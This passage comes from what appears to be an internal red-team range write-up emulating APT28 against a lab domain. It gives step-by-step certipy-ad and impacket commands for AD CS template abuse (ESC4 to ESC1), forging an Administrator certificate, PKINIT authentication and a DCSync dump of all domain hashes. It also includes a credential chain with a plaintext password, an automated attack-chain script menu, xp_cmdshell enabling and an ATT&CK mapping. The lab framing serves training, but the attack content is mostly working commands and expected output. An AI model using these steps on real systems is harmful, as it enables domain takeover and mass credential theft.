Write the default template configuration, which sets `msPKI-Certificate-Name-Flag` to `1` (enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`). This converts the template from ESC4-only to ESC1-exploitable.

```bash
# ESC4: Use certipy-ad template to rewrite the template's default configuration
# -write-default-configuration resets the template to default values, which
# includes enabling Enrollee Supplies Subject (the ESC1 condition)
echo 'y' | certipy-ad template $ADM_CRED \
  -dc-ip <DC_IP> \
  -template 'CorpAuth' \
  -target DC01.cyberange.local \
  -write-default-configuration \
  2>&1 | tee /opt/redteam/loot/esc4_modify.txt

# Wait for AD replication to propagate the template change to the CA
# The CA reads templates from AD — no service restart needed
sleep 10
```

### Phase 5c — ESC1: Request a Certificate as Administrator

With `Enrollee Supplies Subject` now enabled, request a certificate from the `CorpAuth` template specifying `Administrator@cyberange.local` as the UPN in the SAN field. The CA will issue this certificate to whoever requests it, regardless of whether the requester is actually Administrator.

```bash
# ESC1: Request cert with Administrator's UPN in the SAN
# -upn  : the UPN to embed in the Subject Alternative Name
# -ca   : the CA name (from certipy enum)
yes | certipy-ad req $ADM_CRED \
  -dc-ip <DC_IP> \
  -ca 'cyberange-CA' \
  -template 'CorpAuth' \
  -upn 'Administrator@cyberange.local' \
  -target SRV04-CA.cyberange.local \
  2>&1 | tee /opt/redteam/loot/esc1_request.txt

# Confirm the PFX was saved
ls -la administrator*.pfx
```

**Expected output:**

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 2
[*] Got certificate with UPN 'Administrator@cyberange.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

### Phase 5d — PKINIT Authentication as Administrator

Use the forged certificate to perform PKINIT Kerberos authentication as Administrator. The KDC validates the certificate chain (issued by the trusted enterprise CA) and issues a TGT along with the Administrator NT hash.

```bash
# Authenticate using the Administrator certificate via PKINIT
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip <DC_IP> \
  2>&1 | tee /opt/redteam/loot/pkinit_auth.txt

# Load the resulting TGT into the Kerberos credential cache
export KRB5CCNAME=$(ls -t /opt/redteam/*.ccache | head -1)

# Extract the Administrator NT hash from the output
ADMIN_HASH=$(grep -oP '[a-fA-F0-9]{32}' /opt/redteam/loot/pkinit_auth.txt | tail -1)
echo "Administrator NT hash: $ADMIN_HASH"
```

### Phase 5e — Verify Domain Admin Access on DC01

Confirm the TGT or NT hash grants Domain Admin access to the DC before running DCSync.

```bash
# Verify via Kerberos TGT (preferred)
impacket-wmiexec -k -no-pass \
  'cyberange.local/Administrator@DC01.cyberange.local' \
  'whoami && hostname && net group "Domain Admins" /domain'

# Alternative: verify via pass-the-hash if TGT is unavailable
impacket-wmiexec \
  'cyberange.local/Administrator@DC01.cyberange.local' \
  -hashes ":$ADMIN_HASH" \
  'whoami && hostname && net group "Domain Admins" /domain'

# Expected output:
# cyberange\administrator
# DC01
```

### Phase 5f — DCSync — Full Domain Credential Dump

With Administrator access confirmed, DCSync extracts every credential hash from the domain by impersonating a Domain Controller's replication partner. No files are touched on DC01's disk.

```bash
# DCSync via Kerberos TGT
impacket-secretsdump -k -no-pass \
  'cyberange.local/Administrator@DC01.cyberange.local' \
  2>&1 | tee /opt/redteam/loot/dcsync_hashes.txt

# Alternative: DCSync via pass-the-hash
impacket-secretsdump \
  'cyberange.local/Administrator@DC01.cyberange.local' \
  -hashes ":$ADMIN_HASH" \
  2>&1 | tee /opt/redteam/loot/dcsync_hashes.txt

# Count extracted entries
grep -c ':::' /opt/redteam/loot/dcsync_hashes.txt

# Extract highest-value credentials
grep -E '(Administrator|krbtgt|svc_adm|svc_db|svc_app)' /opt/redteam/loot/dcsync_hashes.txt
```

> **Step 5 Result: FULL DOMAIN COMPROMISE.** DCSync completed. All domain credential hashes extracted, including `krbtgt` (Golden Ticket capability) and `Administrator`. cyberange.local is fully owned via certificate-based authentication — no password was ever cracked or guessed beyond the initial share discovery.

---

## 4. Credential Chain Summary

| Credential | Source Host | Extracted From | Enables Access To |
|---|---|---|---|
| svc_db:Db@ccess2025! | SRV01-WEB | SMB archive file (web.config / .ps1) | MSSQL sysadmin → SRV02-DB |
| svc_app execution context | SRV02-DB | SQL Linked Server pivot (no password needed) | xp_cmdshell on SRV03-APP |
| svc_app NT hash | SRV03-APP | LSASS dump via lsassy (post-SYSTEM) | Shadow Credentials ACL write on DC01 |
| svc_adm NT hash | DC01 | Shadow Credentials PKINIT (msDS-KeyCredentialLink) | ADCS template write on SRV04-CA |
| Administrator certificate (PFX) | SRV04-CA | ESC4 → ESC1 template abuse + cert request | PKINIT auth as Administrator → DCSync |
| All domain hashes (inc. krbtgt) | DC01 | DCSync | Full domain — persistent access |

---

## 5. Running the Full Chain

### 5.1 Menu Options

| Option | Action |
|---|---|
| [0] | Setup — DNS, hosts, krb5.conf, tools verification |
| [1] | Step 1 — Share enumeration + credential hunt → svc_db:Db@ccess2025! |
| [2] | Step 2 — SQL recon + linked server pivot → xp_cmdshell on SRV03-APP |
| [3] | Step 3 — PrintSpoofer SYSTEM + LSASS dump → svc_app NT hash |
| [4] | Step 4 — Shadow Credentials → svc_adm NT hash + PKINIT |
| [5] | Step 5 — ESC4 → ESC1 → Administrator cert → PKINIT → DCSync |
| [A] | Run ALL steps sequentially (full automated chain) |
| [S] | Show current state — displays all collected credentials |
| [Q] | Quit — artifacts remain in /opt/redteam/loot/ |

### 5.2 Full Automated Run

Launch the script, complete setup, then select `[A]`. The script pauses five seconds between steps and prompts for manual input if any step fails to auto-extract a credential.

```bash
chmod +x attack_chain_s1.sh
sudo ./attack_chain_s1.sh
# Select [0] — Setup Environment
# Select [A] — Run ALL steps sequentially
```

### 5.3 Loot Directory Structure

```
/opt/redteam/loot/
├── .state_s1                       # saved credential state
├── attack_log.txt                  # full timestamped command log
├── nmap_subnet.txt                 # subnet discovery results
├── nmap_DC01.txt                   # per-host service scans
├── nmap_SRV01-WEB.txt
├── nmap_SRV02-DB.txt
├── nmap_SRV03-APP.txt
├── nmap_SRV04-CA.txt
├── shares_null.txt                 # null session share enumeration
├── shares/                         # per-share spider output
│   ├── spider_WebApps.txt
│   ├── spider_Ops-Scripts.txt
│   └── spider_<share>.txt (×11)
├── configs/                        # downloaded configuration files
│   ├── web.config                  # REAL CREDS — svc_db
│   ├── Weekly_DB_Maintenance.ps1   # REAL CREDS — svc_db
│   └── <decoy files> (×30+)
├── sql_recon_srv02.txt             # SQL recon output from SRV02-DB
├── sql_pivot_results.txt           # linked server pivot output
├── sql_upload_results.txt          # PrintSpoofer upload output
├── sql_privesc_results.txt         # PrintSpoofer SYSTEM escalation output
├── lsassy_srv03.txt                # LSASS dump output (primary)
├── secretsdump_srv03.txt           # secretsdump output (fallback)
├── nxc_lsa_srv03.txt               # nxc LSA output (fallback)
├── svc_app_validate.txt            # svc_app credential validation
├── sql_cleanup_results.txt         # cleanup output
├── shadow_creds.txt                # Shadow Credentials full output
├── certipy_enum.txt                # ADCS enumeration output
├── esc4_modify.txt                 # template modification output
├── esc1_request.txt                # certificate request output
├── pkinit_auth.txt                 # PKINIT authentication output
└── dcsync_hashes.txt               # full DCSync credential dump
```

---

## 6. Troubleshooting

| Issue | Likely Cause | Fix |
|---|---|---|
| SMB null session returns no shares | NullSessionShares or EveryoneIncludesAnonymous not configured | Verify registry settings on SRV01-WEB per setup guide. Restart LanmanServer. |
| mssqlclient fails with "Login failed for user" | Credential wrong or Windows Auth not used correctly | Confirm `-windows-auth` flag is present. Verify svc_db is sysadmin with SA login. |
| `EXEC AT [SRV03-APP]` returns "RPC not available" | RPC OUT disabled on linked server | Run on SRV02-DB: `EXEC sp_serveroption 'SRV03-APP', 'rpc out', 'true'` |
| xp_cmdshell disabled on SRV03-APP | xp_cmdshell not enabled during setup | Enable via linked server: `EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [SRV03-APP]` |
| PrintSpoofer returns "No pipe" or access denied | SeImpersonatePrivilege not present or wrong binary | Confirm `svc_app` has SeImpersonatePrivilege with `whoami /priv` via linked server |
| SMB upload via `net use` fails | SMB server not running or firewall blocking | Confirm `impacket-smbserver` is running before executing the upload SQL. Check UFW on Kali. |
| nxc lsassy returns no svc_app credentials | svc_app session not active in LSASS | Start the SQL service on SRV03-APP to refresh the session. Then retry lsassy. |
| certipy shadow auto produces no output | svc_app does not have WriteProperty on svc_adm | Verify ACL on DC01: `(Get-Acl "AD:\<svc_adm DN>").Access | Where-Object {$_.IdentityReference -like "*svc_app*"}` |
| PKINIT fails with "KDC_ERR_PADATA_TYPE_NOSUPP" | Enterprise CA not enrolled or PKINIT not configured | Verify SRV04-CA is running and DC01 has a CA certificate. Run `certutil -dcinfo` on DC01. |
| certipy template returns "Access denied" | svc_adm does not have WriteProperty on CorpAuth template | Verify the ESC4 ACL was set during CA setup. Re-run Part 5 Step 5.3 of the setup guide. |
| Certificate request fails with "Template not found" | Template not published on the CA | Run on SRV04-CA: `certutil -setcatemplates +CorpAuth` |
| DCSync returns no hashes | Administrator auth failed or domain trust issue | Verify TGT is loaded (`klist`) and not expired. Re-run PKINIT. Fall back to PTH if needed. |

---

## 7. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Step |
|---|---|---|---|
| Reconnaissance | T1595.001 | Active Scanning: Scanning IP Blocks | 1 |
| Discovery | T1083 | File and Directory Discovery | 1 |
| Discovery | T1135 | Network Share Discovery | 1 |
| Credential Access | T1552.001 | Unsecured Credentials: Credentials in Files | 1 |
| Lateral Movement | T1021 | Remote Services: SQL | 2 |
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | 2, 3 |
| Lateral Movement | T1021.006 | Remote Services: Windows Remote Management | 3 |
| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | 3 |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | 3 |
| Persistence | T1136.001 | Create Account: Local Account | 3 |
| Defense Evasion | T1070.001 | Indicator Removal: Clear Windows Event Logs (cleanup) | 3 |
| Credential Access | T1558 | Steal or Forge Kerberos Tickets | 4, 5 |
| Defense Evasion | T1556 | Modify Authentication Process: Shadow Credentials | 4 |
| Credential Access | T1649 | Steal or Forge Authentication Certificates | 5 |
| Privilege Escalation | T1484 | Domain Policy Modification: ADCS template write | 5 |
| Credential Access | T1003.006 | OS Credential Dumping: DCSync | 5 |

### APT28 Technique Alignment

| Step | Technique | APT28 Precedent |
|---|---|---|
| 1 | Credentials in Files | Network share enumeration for credential harvesting — documented GRU tradecraft in NSA/CISA joint advisory |
| 2 | SQL Linked Server Pivot | Database exploitation for lateral movement — standard APT28 post-initial-access pattern |
| 3 | Token Impersonation / LSASS Dump | SeImpersonatePrivilege abuse for privilege escalation; LSASS dumping for credential harvest |
| 4 | Shadow Credentials | Identity manipulation without password modification — APT28 avoids password resets to maintain stealth (Mandiant M-Trends) |
| 5 | ADCS Certificate Abuse | Certificate-based domain takeover for persistent, password-independent authentication — observed in GRU certificate infrastructure operations |

---

> **END OF WRITE-UP**  
> APT28 — Operation IRON MERIDIAN — Range 1: Blind Trust  
> **RESTRICTED — Internal Red Team Use Only**
